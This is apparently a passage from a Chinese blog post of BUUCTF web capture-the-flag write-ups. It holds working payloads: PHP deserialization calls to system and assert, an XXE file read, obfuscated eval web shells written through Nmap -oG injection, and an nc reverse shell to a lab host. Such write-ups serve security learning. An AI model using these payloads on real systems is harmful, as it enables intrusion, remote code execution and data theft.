+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=unserialize&amp;p=O:4:<span class="string">"Test"</span>:2:&#123;s:1:<span class="string">"p"</span>;s:2:<span class="string">"ls"</span>;s:4:<span class="string">"func"</span>;s:6:<span class="string">"system"</span>;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/phpweb/phpweb3.jpg" alt=""><br>可以看到执行成功了，但是没发现flag,去根目录下找找<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/phpweb/phpweb4.jpg" alt=""><br>还是没有。。。，最后在tmp下找到了<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/phpweb/phpweb5.jpg" alt=""><br>cat一下<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/phpweb/phpweb6.jpg" alt=""></p>
+<h3 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h3><p>查看源码，发现xml</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">doLogin</span></span>()&#123;</span><br><span class="line">	var username = $(<span class="string">"#username"</span>).val();</span><br><span class="line">	var password = $(<span class="string">"#password"</span>).val();</span><br><span class="line">	<span class="keyword">if</span>(username == <span class="string">""</span> || password == <span class="string">""</span>)&#123;</span><br><span class="line">		alert(<span class="string">"Please enter the username and password!"</span>);</span><br><span class="line">		<span class="built_in">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	var data = <span class="string">"&lt;user&gt;&lt;username&gt;"</span> + username + <span class="string">"&lt;/username&gt;&lt;password&gt;"</span> + password + <span class="string">"&lt;/password&gt;&lt;/user&gt;"</span>; </span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        <span class="built_in">type</span>: <span class="string">"POST"</span>,</span><br><span class="line">        url: <span class="string">"doLogin.php"</span>,</span><br><span class="line">        contentType: <span class="string">"application/xml;charset=utf-8"</span>,</span><br><span class="line">        data: data,</span><br><span class="line">        dataType: <span class="string">"xml"</span>,</span><br><span class="line">        anysc: <span class="literal">false</span>,</span><br><span class="line">        success: <span class="keyword">function</span> (result) &#123;</span><br><span class="line">        	var code = result.getElementsByTagName(<span class="string">"code"</span>)[0].childNodes[0].nodeValue;</span><br><span class="line">        	var msg = result.getElementsByTagName(<span class="string">"msg"</span>)[0].childNodes[0].nodeValue;</span><br><span class="line">        	<span class="keyword">if</span>(code == <span class="string">"0"</span>)&#123;</span><br><span class="line">        		$(<span class="string">".msg"</span>).text(msg + <span class="string">" login fail!"</span>);</span><br><span class="line">        	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(code == <span class="string">"1"</span>)&#123;</span><br><span class="line">        		$(<span class="string">".msg"</span>).text(msg + <span class="string">" login success!"</span>);</span><br><span class="line">        	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        		$(<span class="string">".msg"</span>).text(<span class="string">"error:"</span> + msg);</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        error: <span class="keyword">function</span> (XMLHttpRequest,textStatus,errorThrown) &#123;</span><br><span class="line">            $(<span class="string">".msg"</span>).text(errorThrown + <span class="string">':'</span> + textStatus);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以想到xxe，burp抓个包<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/FakeXMLcookbook/Fakecookbook0.jpg" alt=""><br>构造一个外部实体，让它包含flag，将flag读出来,因为flag一般都在根目录，所以这里就直接读取file:///flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE zx [</span><br><span class="line">&lt;!ENTITY w1ndy SYSTEM <span class="string">"file:///flag"</span>&gt;]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;w1ndy;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/FakeXMLcookbook/Fakecookbook1.jpg" alt=""></p>
+<h3 id="BJDCTF-2nd-Schrödinger"><a href="#BJDCTF-2nd-Schrödinger" class="headerlink" title="[BJDCTF 2nd]Schrödinger"></a>[BJDCTF 2nd]Schrödinger</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/schrodinger/schrodinger0.jpg" alt=""><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/schrodinger/schrodinger1.jpg" alt=""><br>查看下源码<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/schrodinger/schrodinger2.jpg" alt=""><br>访问一下test.php<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/schrodinger/schrodinger3.jpg" alt=""><br>根据首页的介绍，如果一个页面里有参数，就可以爆破，时间越长，爆破成功几率越大，如果点击check，就会停止爆破，结束进程。那这个页面就需要知道admin的密码，那就可以用首页那个工具来爆破这个密码<br>在工具框里输入：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://f2071973-205b-4598-81eb-84bdc383057e.node3.buuoj.cn/test.php</span><br></pre></td></tr></table></figure>
+<p>点击input后开始爆破，刚开始我还傻傻的等，是真的慢。然后就点击了check<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/schrodinger/schrodinger4.jpg" alt=""><br>感觉问题没这么简单，不可能让我们一直等吧。用burp抓了个包<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/schrodinger/schrodinger5.jpg" alt=""><br>第二个参数很像是base64编码，尝试解码，解码后是1594447625，像是时间戳,转换一下<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/schrodinger/schrodinger6.jpg" alt=""><br>还真是时间戳,尝试修改值为10(base64编码一下):MTA%3D,forward后弹出一个窗口<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/schrodinger/schrodinger7.jpg" alt=""><br>av11664517，B站av号，后面的应该是时间戳，转换一下：2020-03-12 11:53:23<br>去B站搜一下,是个讲量子力学的视频，那个时间猜测是评论的时间<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/schrodinger/schrodinger8.jpg" alt=""></p>
+<h3 id="BJDCTF-2nd-duangShell"><a href="#BJDCTF-2nd-duangShell" class="headerlink" title="[BJDCTF 2nd]duangShell"></a>[BJDCTF 2nd]duangShell</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/duangShell/duanShell0.jpg" alt=""><br>.swp源码泄露,访问.index.php.swp,下载下来后用需要恢复，命令如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim -r index.php.swp</span><br></pre></td></tr></table></figure>
+<p>恢复之后打开，就是源码了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;give me a girl&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;&lt;h1&gt;珍爱网&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"how can i give you source code? .swp?!"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (!isset(<span class="variable">$_POST</span>[<span class="string">'girl_friend'</span>])) </span><br><span class="line">&#123;</span><br><span class="line">    die(<span class="string">"where is P3rh4ps's girl friend ???"</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$girl</span> = <span class="variable">$_POST</span>[<span class="string">'girl_friend'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/\&gt;|\\\/'</span>, <span class="variable">$girl</span>)) </span><br><span class="line">    &#123;</span><br><span class="line">        die(<span class="string">'just girl'</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">'/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i'</span>, <span class="variable">$girl</span>)) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"&lt;img src='img/p3_need_beautiful_gf.png'&gt; &lt;!-- He is p3 --&gt;"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        //duangShell~~~~</span><br><span class="line">        <span class="built_in">exec</span>(<span class="variable">$girl</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这过滤的让人无从下手啊，看了师傅们的wp,说说是反弹shell,涨姿势了<br>因为需要用到另一台机器，就在BUU上申请了个小号，开了一台linux labs实验机<br>xshell连一下：用户名：root,密码：123456,主机：node3.buuoj.cn，端口是随机分配的，我这里的端口是27369<br>连上之后，查看一下实验机的ip,我这台是174.2.44.59,然后监听一下端口，我这选择监听4444端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>
+<p>然后在题目那里post数据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">girl_friend=nc 174.2.44.59 4444 -e /bin/bash</span><br></pre></td></tr></table></figure>
+<p>然后实验机这边就会监听到<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/duangShell/duanShell1.jpg" alt=""><br>找一下flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name *flag*</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/duangShell/duanShell2.jpg" alt=""><br>cat一下flag<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/duangShell/duanShell3.jpg" alt=""></p>
+<h3 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/PYWebsite/PYWebsite0.jpg" alt=""><br>查看源码,发现js代码<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/PYWebsite/PYWebsite1.jpg" alt=""><br>很明显有个flag.php,直接去访问<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/PYWebsite/PYWebsite2.jpg" alt=""><br>除了购买者和他自己的ip能通过，别的无法通过，很容易想到伪造X-Forwarded-For:127.0.0.1<br>我这里用的是个插件X-Forwarded-For Header<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/PYWebsite/PYWebsite3.jpg" alt=""></p>
+<h3 id="BJDCTF-2nd-elementmaster"><a href="#BJDCTF-2nd-elementmaster" class="headerlink" title="[BJDCTF 2nd]elementmaster"></a>[BJDCTF 2nd]elementmaster</h3><p>这个题脑洞有点大啊，看了大佬的wp深感佩服<br>查看源码<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/elementmaster/elementmaster0.jpg" alt=""><br>可以看到,hidden的id是16进制的，解码后为Po.，尝试访问Po.php<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/elementmaster/elementmaster1.jpg" alt=""><br>Po是一种化学元素，中文名为钋，根据题目，大佬说是要遍历元素周期表了，写个脚本跑一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=<span class="string">'http://18bffb99-f7e6-4e79-a76b-0e4ab899a2b1.node3.buuoj.cn/'</span></span><br><span class="line">elements=[<span class="string">'H'</span>, <span class="string">'He'</span>, <span class="string">'Li'</span>, <span class="string">'Be'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'N'</span>, <span class="string">'O'</span>, <span class="string">'F'</span>, <span class="string">'Ne'</span>, <span class="string">'Na'</span>, <span class="string">'Mg'</span>, <span class="string">'Al'</span>, <span class="string">'Si'</span>, <span class="string">'P'</span>, <span class="string">'S'</span>, <span class="string">'Cl'</span>, <span class="string">'Ar'</span>,</span><br><span class="line">        <span class="string">'K'</span>, <span class="string">'Ca'</span>, <span class="string">'Sc'</span>, <span class="string">'Ti'</span>, <span class="string">'V'</span>, <span class="string">'Cr'</span>, <span class="string">'Mn'</span>, <span class="string">'Fe'</span>, <span class="string">'Co'</span>, <span class="string">'Ni'</span>, <span class="string">'Cu'</span>, <span class="string">'Zn'</span>, <span class="string">'Ga'</span>, <span class="string">'Ge'</span>, <span class="string">'As'</span>, <span class="string">'Se'</span>, <span class="string">'Br'</span>,</span><br><span class="line">        <span class="string">'Kr'</span>, <span class="string">'Rb'</span>, <span class="string">'Sr'</span>, <span class="string">'Y'</span>, <span class="string">'Zr'</span>, <span class="string">'Nb'</span>, <span class="string">'Mo'</span>, <span class="string">'Te'</span>, <span class="string">'Ru'</span>, <span class="string">'Rh'</span>, <span class="string">'Pd'</span>, <span class="string">'Ag'</span>, <span class="string">'Cd'</span>, <span class="string">'In'</span>, <span class="string">'Sn'</span>, <span class="string">'Sb'</span>, <span class="string">'Te'</span>,</span><br><span class="line">        <span class="string">'I'</span>, <span class="string">'Xe'</span>, <span class="string">'Cs'</span>, <span class="string">'Ba'</span>, <span class="string">'La'</span>, <span class="string">'Ce'</span>, <span class="string">'Pr'</span>, <span class="string">'Nd'</span>, <span class="string">'Pm'</span>, <span class="string">'Sm'</span>, <span class="string">'Eu'</span>, <span class="string">'Gd'</span>, <span class="string">'Tb'</span>, <span class="string">'Dy'</span>, <span class="string">'Ho'</span>, <span class="string">'Er'</span>, <span class="string">'Tm'</span>,</span><br><span class="line">        <span class="string">'Yb'</span>, <span class="string">'Lu'</span>, <span class="string">'Hf'</span>, <span class="string">'Ta'</span>, <span class="string">'W'</span>, <span class="string">'Re'</span>, <span class="string">'Os'</span>, <span class="string">'Ir'</span>, <span class="string">'Pt'</span>, <span class="string">'Au'</span>, <span class="string">'Hg'</span>, <span class="string">'Tl'</span>, <span class="string">'Pb'</span>, <span class="string">'Bi'</span>, <span class="string">'Po'</span>, <span class="string">'At'</span>, <span class="string">'Rn'</span>,</span><br><span class="line">        <span class="string">'Fr'</span>, <span class="string">'Ra'</span>, <span class="string">'Ac'</span>, <span class="string">'Th'</span>, <span class="string">'Pa'</span>, <span class="string">'U'</span>, <span class="string">'Np'</span>, <span class="string">'Pu'</span>, <span class="string">'Am'</span>, <span class="string">'Cm'</span>, <span class="string">'Bk'</span>, <span class="string">'Cf'</span>, <span class="string">'Es'</span>, <span class="string">'Fm'</span>,<span class="string">'Md'</span>, <span class="string">'No'</span>, <span class="string">'Lr'</span>,</span><br><span class="line">        <span class="string">'Rf'</span>, <span class="string">'Db'</span>, <span class="string">'Sg'</span>, <span class="string">'Bh'</span>, <span class="string">'Hs'</span>, <span class="string">'Mt'</span>, <span class="string">'Ds'</span>, <span class="string">'Rg'</span>, <span class="string">'Cn'</span>, <span class="string">'Nh'</span>, <span class="string">'Fl'</span>, <span class="string">'Mc'</span>, <span class="string">'Lv'</span>, <span class="string">'Ts'</span>, <span class="string">'Og'</span>, <span class="string">'Uue'</span>]</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> elements:</span><br><span class="line">    r=requests.get(url+i+<span class="string">'.php'</span>)</span><br><span class="line">    <span class="keyword">if</span>(r.status_code==200):</span><br><span class="line">        flag+=r.text</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/elementmaster/elementmaster2.jpg" alt=""><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/elementmaster/elementmaster3.jpg" alt=""></p>
+<h3 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$code</span>)&gt;40)&#123;</span><br><span class="line">        die(<span class="string">"This is too Long."</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        die(<span class="string">"NO."</span>);</span><br><span class="line">    @<span class="built_in">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">// ?&gt;</span><br></pre></td></tr></table></figure>
+<p>字母数字全都过滤了，考虑urlencode取反绕过<br>先看一下phpinfo()</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="built_in">echo</span> urlencode(~<span class="string">'phpinfo'</span>);</span><br><span class="line">?&gt;</span><br><span class="line">结果：%8F%97%8F%96%91%99%90</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/RCEME/RCEME0.jpg" alt=""><br>禁了很多系统函数，同样的构造取反一句话</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$a</span> = urlencode(~<span class="string">'assert'</span>);</span><br><span class="line"><span class="variable">$b</span> = urlencode(~<span class="string">'(eval($_POST["w1ndy"]))'</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'?code=(~'</span>.<span class="variable">$a</span>.<span class="string">')'</span>.<span class="string">'(~'</span>.<span class="variable">$b</span>.<span class="string">');'</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%88%CE%91%9B%86%DD%A2%D6%D6);</span><br></pre></td></tr></table></figure>
+<p>蚁剑连上后，因为shell命令被ban了，所以没法直接打开文件，终端也无法使用，我们需要绕过disable_functions,蚁剑刚好有一个这样的插件，但是蚁剑的插件中心挂掉了，一直加载不出来，在网上找到了解决办法<br><a href="https://github.com/Medicean/as_bypass_php_disable_functions/tree/7d28318c5f0a795dc96bda95e37d04a05b5bf2a2" target="_blank" rel="noopener">https://github.com/Medicean/as_bypass_php_disable_functions/tree/7d28318c5f0a795dc96bda95e37d04a05b5bf2a2</a><br>下载下来解压后将其放到antData/plugins目录下，重启蚁剑，就能看见插件了<br>接下来使用该插件来绕过disable_functions<br>右键目标项，加载插件–&gt;辅助工具–&gt;目标插件<br>进入后，选择模式，这里选择PHP_GC_UAF<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/RCEME/RCEME1.jpg" alt=""><br>点击开始，就会进入终端<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/RCEME/RCEME2.jpg" alt=""></p>
+<h3 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Nmap/nmap0.jpg" alt=""><br>这个和之前做的OnlineTool很像，直接把payload拿过来测试一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'&lt;?php @eval($_POST["pass"]); ?&gt; -oG test.php'</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Nmap/nmap1.jpg" alt=""><br>猜测过滤了&lt;?,用js来调用php</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'&lt;script language=‘php‘&gt;@eval($_POST['</span>pass<span class="string">']);&lt;/script&gt; -oG test.php'</span></span><br></pre></td></tr></table></figure>
+<p>结果还是一样，那就应该是过滤了php,使用短标签绕过</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'&lt;?= @eval($_POST["pass"]);?&gt; -oG test.phtml'</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Nmap/nmap2.jpg" alt=""><br>成功写入，蚁剑连接一下，在根目录找到flag</p>
+<h3 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h3><p>查看源码，发现time.php?source<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/ReadlezPHP/ReadlezPHP0.jpg" alt=""><br>访问time.php?source</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$a</span>;</span><br><span class="line">    public <span class="variable">$b</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;a = <span class="string">"Y-m-d h:i:s"</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;b = <span class="string">"date"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="variable">$this</span>-&gt;b;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = new HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'source'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="variable">$ppp</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">"data"</span>]);</span><br></pre></td></tr></table></figure>
+<p>反序列化，在__destruct中可以看到，$b($a)，即$b作为函数名，$a作为函数的参数，那这里就可构造代码执行，先看一下phpinfo()</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$a</span>;</span><br><span class="line">    public <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = new HelloPhp();</span><br><span class="line"><span class="variable">$c</span>-&gt;a=<span class="string">'phpinfo()'</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;b=<span class="string">"assert"</span>;</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure>
+<p>Payload:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?data=O:8:<span class="string">"HelloPhp"</span>:2:&#123;s:1:<span class="string">"a"</span>;s:9:<span class="string">"phpinfo()"</span>;s:1:<span class="string">"b"</span>;s:6:<span class="string">"assert"</span>;&#125;</span><br></pre></td></tr></table></figure>
+<p>在phpinfo()中发现flag<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/ReadlezPHP/ReadlezPHP1.jpg" alt=""></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/post/31b2abaa.html" rel="next" title="Sqli-labs">
+                <i class="fa fa-chevron-left"></i> Sqli-labs
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/post/6f5092d6.html" rel="prev" title="Bugku-Web">
+                Bugku-Web <i class="fa fa-chevron-right"></i>
+              </a>
+            
